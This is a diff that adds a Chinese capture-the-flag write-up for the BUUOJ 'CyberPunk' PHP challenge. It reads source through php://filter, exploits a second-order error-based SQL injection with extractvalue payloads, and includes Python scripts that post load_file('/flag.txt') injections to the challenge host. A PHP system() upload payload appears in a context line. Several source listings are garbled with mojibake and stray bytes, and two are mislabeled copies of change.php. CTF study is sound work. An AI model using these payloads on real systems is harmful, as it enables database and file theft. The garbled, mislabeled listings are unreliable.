@@ -5799,6 +5799,713 @@ file_put_contents("filename", phpinfo());
 payload：action=upload&data=<?system("cat%09/flllllll1112222222lag")?>
 ```
 
+## BUUOJ [CISCN2019 华北赛区 Day1 Web5]CyberPunk
+
+> 这题，我要吐槽一下：永远鄙视把FLAG藏起来的作者！！！到底是为了考什么要把FLAG藏起来！
+>
+> 我都已经注入到受不了了，用脚本跑都找不到
+
+进入查看首页源码拿到一个关键提示：
+
+经验就可以直接知道这里能做一个文件包含，尝试了一下使用`php://filter`成功拿到源码
+
+![image-20240215013451723](CTF.assets/image-20240215013451723.png)
+
+
+
+**index.php**
+
+```php
+<?php
+# index.php
+ini_set('open_basedir', '/var/www/html/');
+
+// $file = $_GET["file"];
+$file = (isset($_GET['file']) ? $_GET['file'] : null);
+if (isset($file)){
+    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
+        echo('no way!');
+        exit;
+    }
+    @include($file);
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>index</title>
+    <base href="./">
+    <meta charset="utf-8" />
+
+    <link href="assets/css/bootstrap.css" rel="stylesheet">
+    <link href="assets/css/custom-animations.css" rel="stylesheet">
+    <link href="assets/css/style.css" rel="stylesheet">
+
+</head>
+<body>
+<div id="h">
+    <div class="container">
+        <h2>2077发售了,不来份实体典藏版吗?</h2>
+        <img class="logo" src="./assets/img/logo-en.png"><!--LOGOLOGOLOGOLOGO-->
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2 centered">
+                <h3>提交订单</h3>
+                <form role="form" action="./confirm.php" method="post" enctype="application/x-www-urlencoded">
+                    <p>
+                    <h3>姓名:</h3>
+                    <input type="text" class="subscribe-input" name="user_name">
+                    <h3>电话:</h3>
+                    <input type="text" class="subscribe-input" name="phone">
+                    <h3>地址:</h3>
+                    <input type="text" class="subscribe-input" name="address">
+                    </p>
+                    <button class='btn btn-lg  btn-sub btn-white' type="submit">我正是送钱之人</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="f">
+    <div class="container">
+        <div class="row">
+            <h2 class="mb">订单管理</h2>
+            <a href="./search.php">
+                <button class="btn btn-lg btn-register btn-white" >我要查订单</button>
+            </a>
+            <a href="./change.php">
+                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
+            </a>
+            <a href="./delete.php">
+                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
+            </a>
+        </div>
+    </div>
+</div>
+
+<script src="assets/js/jquery.min.js"></script>
+<script src="assets/js/bootstrap.min.js"></script>
+<script src="assets/js/retina-1.1.0.js"></script>
+<script src="assets/js/jquery.unveilEffects.js"></script>
+</body>
+</html>
+<!--?file=?-->
+```
+
+**search.php**
+
+```php
+<?php
+# search.php
+
+$_POST["user_name"] = 'select';
+$_POST["phone"] = 'select';
+if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
+{
+    $msg = '';
+    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
+    $user_name = $_POST["user_name"];
+    $phone = $_POST["phone"];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = 'no sql inject!';
+    }else{
+        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
+        $fetch = $db->query($sql);
+    }
+
+    if (isset($fetch) && $fetch->num_rows>0){
+        $row = $fetch->fetch_assoc();
+        if(!$row) {
+            echo 'error';
+            print_r($db->error);
+            exit;
+        }
+        $msg = "<p>姓名:".$row['user_name']."</p><p>, 电话:".$row['phone']."</p><p>, 地址:".$row['address']."</p>";
+    } else {
+        $msg = "未找到订单!";
+    }
+}else {
+    $msg = "信息不全";
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>搜索</title>
+    <base href="./">
+
+    <link href="assets/css/bootstrap.css" rel="stylesheet">
+    <link href="assets/css/custom-animations.css" rel="stylesheet">
+    <link href="assets/css/style.css" rel="stylesheet">
+
+</head>
+<body>
+<div id="h">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2 centered">
+                <p style="margin:35px 0;"><br></p>
+                <h1>订单查询</h1>
+                <form method="post">
+                    <p>
+                    <h3>姓名:</h3>
+                    <input type="text" class="subscribe-input" name="user_name">
+                    <h3>电话:</h3>
+                    <input type="text" class="subscribe-input" name="phone">
+                    </p>
+                    <p>
+                        <button class='btn btn-lg  btn-sub btn-white' type="submit">查询订单</button>
+                    </p>
+                </form>
+                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="f">
+    <div class="container">
+        <div class="row">
+            <p style="margin:35px 0;"><br></p>
+            <h2 class="mb">订单管理</h2>
+            <a href="./index.php">
+                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>
+            </a>
+            <a href="./change.php">
+                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
+            </a>
+            <a href="./delete.php">
+                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
+            </a>
+        </div>
+    </div>
+</div>
+
+<script src="assets/js/jquery.min.js"></script>
+<script src="assets/js/bootstrap.min.js"></script>
+<script src="assets/js/retina-1.1.0.js"></script>
+<script src="assets/js/jquery.unveilEffects.js"></script>
+</body>
+</html>
+```
+
+**change.php**
+
+```php
+<?php
+# change.php
+require_once "config.php";
+
+if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
+{
+    $msg = '';
+    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
+    $user_name = $_POST["user_name"];
+    $address = addslashes($_POST["address"]);
+    $phone = $_POST["phone"];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = 'no sql inject!';
+    }else{
+        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
+        $fetch = $db->query($sql);
+    }
+
+    if (isset($fetch) && $fetch->num_rows>0){
+        $row = $fetch->fetch_assoc();
+        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
+        $result = $db->query($sql);
+        if(!$result) {
+            echo 'error';
+            print_r($db->error);
+            exit;
+        }
+        $msg = "è®¢åä¿®æ¹æå";
+    } else {
+        $msg = "æªæ¾å°è®¢å!";
+    }
+}else {
+    $msg = "ä¿¡æ¯ä¸å¨";
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>ä¿®æ¹æ¶è´§å°å</title>
+    <base href="./">
+
+    <link href="assets/css/bootstrap.css" rel="stylesheet">
+    <link href="assets/css/custom-animations.css" rel="stylesheet">
+    <link href="assets/css/style.css" rel="stylesheet">
+
+</head>
+<body>
+<div id="h">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2 centered">
+                <p style="margin:35px 0;"><br></p>
+                <h1>ä¿®æ¹æ¶è´§å°å</h1>
+                <form method="post">
+                    <p>
+                    <h3>å§å:</h3>
+                    <input type="text" class="subscribe-input" name="user_name">
+                    <h3>çµè¯:</h3>
+                    <input type="text" class="subscribe-input" name="phone">
+                    <h3>å°å:</h3>
+                    <input type="text" class="subscribe-input" name="address">
+                    </p>
+                    <p>
+                        <button class='btn btn-lg  btn-sub btn-white' type="submit">ä¿®æ¹è®¢å</button>
+                    </p>
+                </form>
+                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="f">
+    <div class="container">
+        <div class="row">
+            <p style="margin:35px 0;"><br></p>
+            <h2 class="mb">è®¢åç®¡ç</h2>
+            <a href="./index.php">
+                <button class='btn btn-lg btn-register btn-sub btn-white'>è¿å</button>
+            </a>
+            <a href="./search.php">
+                <button class="btn btn-lg btn-register btn-white" >æè¦æ¥è®¢å</button>
+            </a>
+            <a href="./delete.php">
+                <button class="btn btn-lg btn-register btn-white" >æä¸æ³è¦äº</button>
+            </a>
+        </div>
+    </div>
+</div>
+
+<script src="assets/js/jquery.min.js"></script>
+<script src="assets/js/bootstrap.min.js"></script>
+<script src="assets/js/retina-1.1.0.js"></script>
+<script src="assets/js/jquery.unveilEffects.js"></script>
+</body>
+</html>
+8$Ø<HmPfV§
+```
+
+**delete.php**
+
+```php
+<?php
+# change.php
+require_once "config.php";
+
+if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
+{
+    $msg = '';
+    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
+    $user_name = $_POST["user_name"];
+    $address = addslashes($_POST["address"]);
+    $phone = $_POST["phone"];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = 'no sql inject!';
+    }else{
+        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
+        $fetch = $db->query($sql);
+    }
+
+    if (isset($fetch) && $fetch->num_rows>0){
+        $row = $fetch->fetch_assoc();
+        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
+        $result = $db->query($sql);
+        if(!$result) {
+            echo 'error';
+            print_r($db->error);
+            exit;
+        }
+        $msg = "è®¢åä¿®æ¹æå";
+    } else {
+        $msg = "æªæ¾å°è®¢å!";
+    }
+}else {
+    $msg = "ä¿¡æ¯ä¸å¨";
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>ä¿®æ¹æ¶è´§å°å</title>
+    <base href="./">
+
+    <link href="assets/css/bootstrap.css" rel="stylesheet">
+    <link href="assets/css/custom-animations.css" rel="stylesheet">
+    <link href="assets/css/style.css" rel="stylesheet">
+
+</head>
+<body>
+<div id="h">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2 centered">
+                <p style="margin:35px 0;"><br></p>
+                <h1>ä¿®æ¹æ¶è´§å°å</h1>
+                <form method="post">
+                    <p>
+                    <h3>å§å:</h3>
+                    <input type="text" class="subscribe-input" name="user_name">
+                    <h3>çµè¯:</h3>
+                    <input type="text" class="subscribe-input" name="phone">
+                    <h3>å°å:</h3>
+                    <input type="text" class="subscribe-input" name="address">
+                    </p>
+                    <p>
+                        <button class='btn btn-lg  btn-sub btn-white' type="submit">ä¿®æ¹è®¢å</button>
+                    </p>
+                </form>
+                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="f">
+    <div class="container">
+        <div class="row">
+            <p style="margin:35px 0;"><br></p>
+            <h2 class="mb">è®¢åç®¡ç</h2>
+            <a href="./index.php">
+                <button class='btn btn-lg btn-register btn-sub btn-white'>è¿å</button>
+            </a>
+            <a href="./search.php">
+                <button class="btn btn-lg btn-register btn-white" >æè¦æ¥è®¢å</button>
+            </a>
+            <a href="./delete.php">
+                <button class="btn btn-lg btn-register btn-white" >æä¸æ³è¦äº</button>
+            </a>
+        </div>
+    </div>
+</div>
+
+<script src="assets/js/jquery.min.js"></script>
+<script src="assets/js/bootstrap.min.js"></script>
+<script src="assets/js/retina-1.1.0.js"></script>
+<script src="assets/js/jquery.unveilEffects.js"></script>
+</body>
+</html>
+8$Ø<HmPfV§
+```
+
+**config.php**
+
+```php
+<?php
+# change.php
+require_once "config.php";
+
+if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
+{
+    $msg = '';
+    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
+    $user_name = $_POST["user_name"];
+    $address = addslashes($_POST["address"]);
+    $phone = $_POST["phone"];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = 'no sql inject!';
+    }else{
+        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
+        $fetch = $db->query($sql);
+    }
+
+    if (isset($fetch) && $fetch->num_rows>0){
+        $row = $fetch->fetch_assoc();
+        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
+        $result = $db->query($sql);
+        if(!$result) {
+            echo 'error';
+            print_r($db->error);
+            exit;
+        }
+        $msg = "è®¢åä¿®æ¹æå";
+    } else {
+        $msg = "æªæ¾å°è®¢å!";
+    }
+}else {
+    $msg = "ä¿¡æ¯ä¸å¨";
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>ä¿®æ¹æ¶è´§å°å</title>
+    <base href="./">
+
+    <link href="assets/css/bootstrap.css" rel="stylesheet">
+    <link href="assets/css/custom-animations.css" rel="stylesheet">
+    <link href="assets/css/style.css" rel="stylesheet">
+
+</head>
+<body>
+<div id="h">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2 centered">
+                <p style="margin:35px 0;"><br></p>
+                <h1>ä¿®æ¹æ¶è´§å°å</h1>
+                <form method="post">
+                    <p>
+                    <h3>å§å:</h3>
+                    <input type="text" class="subscribe-input" name="user_name">
+                    <h3>çµè¯:</h3>
+                    <input type="text" class="subscribe-input" name="phone">
+                    <h3>å°å:</h3>
+                    <input type="text" class="subscribe-input" name="address">
+                    </p>
+                    <p>
+                        <button class='btn btn-lg  btn-sub btn-white' type="submit">ä¿®æ¹è®¢å</button>
+                    </p>
+                </form>
+                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="f">
+    <div class="container">
+        <div class="row">
+            <p style="margin:35px 0;"><br></p>
+            <h2 class="mb">è®¢åç®¡ç</h2>
+            <a href="./index.php">
+                <button class='btn btn-lg btn-register btn-sub btn-white'>è¿å</button>
+            </a>
+            <a href="./search.php">
+                <button class="btn btn-lg btn-register btn-white" >æè¦æ¥è®¢å</button>
+            </a>
+            <a href="./delete.php">
+                <button class="btn btn-lg btn-register btn-white" >æä¸æ³è¦äº</button>
+            </a>
+        </div>
+    </div>
+</div>
+
+<script src="assets/js/jquery.min.js"></script>
+<script src="assets/js/bootstrap.min.js"></script>
+<script src="assets/js/retina-1.1.0.js"></script>
+<script src="assets/js/jquery.unveilEffects.js"></script>
+</body>
+</html>
+8$Ø<HmPfV§
+```
+
+**config.php**
+
+```php
+<?php
+# config.php
+ini_set("open_basedir", getcwd() . ":/etc:/tmp");
+
+$DATABASE = array(
+
+    "host" => "127.0.0.1",
+    "username" => "root",
+    "password" => "root",
+    "dbname" =>"ctfusers"
+);
+
+$db = new mysqli($DATABASE['host'],$DATABASE['username'],$DATABASE['password'],$DATABASE['dbname']);
+```
+
+**confirm.php**
+
+```php
+confirm.php
+<?php
+
+require_once "config.php";
+//var_dump($_POST);
+
+if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
+{
+    $msg = '';
+    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
+    $user_name = $_POST["user_name"];
+    $address = $_POST["address"];
+    $phone = $_POST["phone"];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = 'no sql inject!';
+    }else{
+        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
+        $fetch = $db->query($sql);
+    }
+
+    if($fetch->num_rows>0) {
+        $msg = $user_name."已提交订单";
+    }else{
+        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
+        $re = $db->prepare($sql);
+        $re->bind_param("sss", $user_name, $address, $phone);
+        $re = $re->execute();
+        if(!$re) {
+            echo 'error';
+            print_r($db->error);
+            exit;
+        }
+        $msg = "订单提交成功";
+    }
+} else {
+    $msg = "信息不全";
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>确认订单</title>
+    <base href="./">
+    <meta charset="utf-8"/>
+
+    <link href="assets/css/bootstrap.css" rel="stylesheet">
+    <link href="assets/css/custom-animations.css" rel="stylesheet">
+    <link href="assets/css/style.css" rel="stylesheet">
+
+</head>
+<body>
+<div id="h">
+    <div class="container">
+        <img class="logo" src="./assets/img/logo-zh.png">
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2 centered">
+                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
+                <a href="./index.php">
+                    <button class='btn btn-lg  btn-sub btn-white'>返回</button>
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="f">
+    <div class="container">
+        <div class="row">
+            <p style="margin:35px 0;"><br></p>
+            <h2 class="mb">订单管理</h2>
+            <a href="./search.php">
+                <button class="btn btn-lg btn-register btn-white" >我要查订单</button>
+            </a>
+            <a href="./change.php">
+                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
+            </a>
+            <a href="./delete.php">
+                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
+            </a>
+        </div>
+    </div>
+</div>
+
+<script src="assets/js/jquery.min.js"></script>
+<script src="assets/js/bootstrap.min.js"></script>
+<script src="assets/js/retina-1.1.0.js"></script>
+<script src="assets/js/jquery.unveilEffects.js"></script>
+</body>
+</html>
+```
+
+### 源码分析
+
+首先先看`confirm.php`，因为这里是入口，如果这里做了过滤，那么基本就没得玩了，这里可以看到正则匹配的是过滤了`select`的，但是只对`user_name`和`phone`做了检测，并且只要SQL查询报错就会返回错误信息，那么只要后续调用了`address`的内容，就可以做到SQL二次注入
+
+![image-20240215013950872](CTF.assets/image-20240215013950872.png)
+
+再看`change.php`，这里刚好是调用了`$row['address']`，那么就完全可以做一个SQL二次注入，且在`address`这里是没有任何过滤出的报错注入漏洞
+
+![image-20240215014200530](CTF.assets/image-20240215014200530.png)
+
+首先先注入一个用户，地址写`1\`，成功触发SQL报错
+
+![image-20240215014356064](CTF.assets/image-20240215014356064.png)
+
+这里直接给出数据和payload
+
+**注意：**这里`#`是直接写进数据库的，所以不用做URL编码
+
+```
+数据库：ctfusers
+表名：user
+字段名：user_id,address,old_address,user_name,phone
+
+# 爆表
+1' and extractvalue(0x7e, concat(0x7e, (select table_name from information_schema.tables where table_schema=database())))#
+
+# 爆字段
+1' and extractvalue(0x7e, concat(0x7e, (select substr(group_concat(column_name), 1, 30) from information_schema.columns where table_name='user' and table_schema=database())))#
+
+数据库：ctftraining
+表名：FLAG_TABLE,news,users
+字段名：FLAG_COLUMN
+
+# 爆字段
+1' and extractvalue(0x7e, concat(0x7e, (select substr(group_concat(column_name), 1, 30) from information_schema.columns where table_name='FLAG_TABLE' and table_schema='ctftraining')))#
+```
+
+这里爆空了都爆不出FLAG，最后看了一下WP，说FLAG在`/flag.txt`，这里直接给出爆破脚本
+
+**注册脚本**
+
+```python
+import requests
+
+base_url = 'http://35853ff1-5d44-4d73-98ee-953d64822264.node5.buuoj.cn:81/confirm.php'
+
+start = 1
+end = 30
+
+for i in range(1, 20):
+    data = {
+        'address': f"1' and extractvalue(0x7e, concat(0x7e, (select substr(load_file('/flag.txt'), {start}, {end}))))#",
+        'phone': '123',
+        'user_name': f"jkl{i}"
+    }
+
+    req = requests.post(base_url, data=data).content.decode()
+
+    start += 30
+    end += 30
+    print(req)
+
+```
+
+**查询脚本**
+
+```python
+import requests
+
+base_url = 'http://35853ff1-5d44-4d73-98ee-953d64822264.node5.buuoj.cn:81/change.php'
+
+for j in range(1, 20):
+    data = {
+        'address': '1',
+        'phone': '123',
+        'user_name': f"jkl{j}"
+    }
+
+    req = requests.post(base_url, data=data).content.decode()
+    print(req)
+
+```
+
+```
+FLAG：flag{be45f1f6-fd8a-4922-a605-1086aa8236cb}
+```
+
+
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
